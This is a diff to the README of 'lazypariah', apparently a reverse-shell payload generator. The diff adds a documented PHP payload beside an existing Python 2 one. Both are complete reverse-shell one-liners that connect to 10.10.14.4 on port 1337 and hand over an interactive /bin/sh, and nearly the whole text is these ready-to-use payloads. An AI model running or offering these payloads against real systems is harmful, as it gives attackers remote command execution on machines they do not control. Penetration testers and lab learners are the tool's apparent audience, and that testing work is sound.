@@ -63,6 +63,10 @@ Output of command `lazypariah python2_c 10.10.14.4 1337`:
 ```
 python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+Output of command `lazypariah php_fd_3_tags 10.10.14.4 1337`:
+```
+<?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>
+```
 
 ## Author
 Copyright (C) 2020 Peter Bruce Funnell
